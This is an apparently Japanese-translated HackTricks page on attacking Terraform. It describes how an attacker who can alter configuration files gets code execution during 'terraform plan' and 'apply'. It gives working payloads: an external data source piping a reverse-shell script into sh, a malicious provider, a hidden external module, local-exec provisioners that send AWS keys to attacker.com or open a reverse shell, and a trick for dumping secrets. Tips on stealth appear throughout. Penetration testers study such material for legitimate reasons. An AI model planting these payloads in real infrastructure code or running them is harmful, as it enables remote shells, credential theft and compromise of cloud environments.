# Terraformセキュリティ

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリに参加する

</details>

## 基本情報

HashiCorp Terraformは、**クラウドとオンプレミスのリソースを人間が読める設定ファイルで定義**し、バージョン管理、再利用、共有ができる**インフラストラクチャコードツール**です。一貫したワークフローを使用して、ライフサイクル全体でインフラストラクチャをプロビジョニングおよび管理できます。Terraformは、コンピューティング、ストレージ、ネットワーキングリソースなどの低レベルコンポーネントだけでなく、DNSエントリやSaaS機能などの高レベルコンポーネントも管理できます。

### Terraformの動作原理

Terraformは、クラウドプラットフォームや他のサービスの**アプリケーションプログラミングインターフェース（API）**を介してリソースを作成および管理します。プロバイダを使用することで、Terraformはアクセス可能なAPIを持つほとんどのプラットフォームやサービスと連携できます。

![](<../../.gitbook/assets/image (33).png>)

HashiCorpとTerraformコミュニティは、既に**1700以上のプロバイダ**を作成しており、さまざまな種類のリソースとサービスを管理しています。この数は今後も増え続けます。Amazon Web Services（AWS）、Azure、Google Cloud Platform（GCP）、Kubernetes、Helm、GitHub、Splunk、DataDogなど、すべての公開プロバイダは[Terraform Registry](https://registry.terraform.io/)で見つけることができます。

Terraformのコアワークフローは次の3つのステージで構成されています。

* **記述**: 複数のクラウドプロバイダやサービスにまたがるリソースを定義します。たとえば、仮想マシン上にアプリケーションをデプロイする構成を作成し、セキュリティグループとロードバランサーを含めることができます。
* **計画**: Terraformは、既存のインフラストラクチャと構成に基づいて、作成、更新、または削除するインフラストラクチャを記述した実行計画を作成します。
* **適用**: 承認されると、Terraformは提案された操作を正しい順序で実行し、リソースの依存関係を尊重します。たとえば、VPCのプロパティを更新し、そのVPC内の仮想マシンの数を変更した場合、Terraformは仮想マシンのスケーリング前にVPCを再作成します。

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterpriseでは、`terraform plan`や`terraform apply`などのコマンドを**Terraform Cloudのセルフホストバージョン**でリモートで実行できます。したがって、Terraformサーバにアクセスするための**APIキー**を見つけることができれば、それを**侵害**することができます。\
詳細については、次を参照してください：

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Terraformラボ

コンピュータにTerraformをインストールするだけです。

[ガイド](https://learn.hashicorp.com/tutorials/terraform/install-cli)を参照して、[Terraformをダウンロードする最良の方法](https://www.terraform.io/downloads)を参照してください。

## TerraformでのRCE

Terraformは、**ウェブページやネットワークサービスを公開するプラットフォームを持っていない**ため、列挙できる方法はありません。したがって、Terraformを侵害する唯一の方法は、**Terraform構成ファイルを追加/変更できる**ことです。

ただし、Terraformは適切に動作するために異なる場所への**特権アクセス**を持つため、侵害すると非常に敏感なコンポーネントです。

攻撃者がTerraformが実行されているシステムを侵害できるようにするための主な方法は、Terraform構成を格納するリポジトリを侵害することです。なぜなら、ある時点でそれらが**解釈**されるからです。

実際には、**Atlantis**など、PRが作成された後に自動的に`terraform plan/apply`を実行するソリューションが存在します。

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Terraformファイルを侵害できる場合、`terraform plan`または`terraform apply`が実行されたときにRCEを実行するさまざまな方法があります。

### Terraform plan

Terraform planは、Terraformで**最もよく使用されるコマンド**であり、開発者やTerraformを使用するソリューションは常にこれを呼び出します。したがって、RCEを取得する**最も簡単な方法**は、`terraform plan`で任意のコマンドを実行するようなTerraform構成ファイルを改ざんすることです。

#### 外部プロバイダの使用

Terraformは、Terraformと外部プログラムの間のインターフェースを提供する[`external`プロバイダ](https://registry.terraform.io/providers/hashicorp/external/latest/docs)を提供しています。`external`データソースを使用して、`plan`中に任意のコードを実行できます。

`terraform plan`を実行する際に、次のようなTerraform構成ファイルに注入すると、revシェルが実行されます。
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### カスタムプロバイダの使用

誰でも[カスタムプロバイダ](https://learn.hashicorp.com/tutorials/terraform/provider-setup)を作成し、[Terraform Registry](https://registry.terraform.io/)に公開することができます。また、プライベートレジストリからカスタムプロバイダを取得することもできます。

以下の手順で実行します：

* 悪意のあるコード（資格情報や顧客データの外部への送信など）を実行するカスタムプロバイダを作成します。
* 作成したプロバイダをTerraform Registryに公開します。
* フィーチャーブランチにプロバイダをTerraformコードに追加します。
* フィーチャーブランチに対してPR（プルリクエスト）を作成します。
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
プロバイダは`init`中に取得され、`plan`中にいくつかのコードが実行されるため、任意のコードを実行できます。

[https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)に例があります。

#### 外部リファレンスの使用

上記のオプションのどちらも有用ですが、あまりステルス性がありません（2番目のオプションは1番目よりもステルス性が高いですが、複雑さも高いです）。以下の提案に従って、よりステルス性の高い方法でこの攻撃を実行できます。

* terraformファイルに直接revシェルを追加する代わりに、revシェルを含む**外部リソースを読み込む**ことができます。
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
revシェルのコードは[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)にあります。

* 外部リソースでは、**ref**機能を使用して、リポジトリ内の**terraform revシェルコードをブランチに隠す**ことができます。例えば、`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`のようなものです。

### Terraform Apply

Terraform applyは、すべての変更を適用するために実行されます。また、**[local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)**を使用して、**悪意のあるTerraformファイルを注入することでRCEを取得することもできます。**\
以下のようなペイロードが`main.tf`ファイルに含まれるようにするだけです。
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
前のテクニックの提案に従って、外部参照を使用してよりステルス性の高い方法でこの攻撃を実行します。

## シークレットのダンプ

`terraform apply`を実行することで、Terraformで使用されるシークレット値をダンプすることができます。Terraformファイルに次のようなものを追加します。
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## 監査ツール

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsecは、Terraformコードの静的解析を使用して潜在的な設定ミスを検出します。
* [**terascan**](https://github.com/tenable/terrascan): Terrascanは、インフラストラクチャコードの静的解析ツールです。

## 参考文献

* [Atlantis Security](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**最新版のPEASSを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有しましょう。

</details>
